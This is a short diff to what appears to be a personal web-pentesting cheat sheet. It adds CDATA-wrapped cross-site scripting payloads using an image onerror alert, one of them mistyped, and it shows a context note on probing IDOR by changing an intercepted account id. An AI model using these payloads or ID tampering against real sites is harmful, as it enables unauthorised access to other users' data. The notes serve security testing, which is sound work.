@@ -494,6 +494,18 @@ for old browsers
 <![CDATA[><img src="broken" onerror="alert(1)">]]>
 
 
+for old browsers 
+<![CDATA[<img src="broken" onerro"alert(1)">]]>
+<![CDATA[><img src="broken" onerror="alert(1)">]]>
+
+
+
+
+
+
+
+
+
 ------------------------------------------------------------
 IDOR :: 
   GO to my account and intercept data then change id 
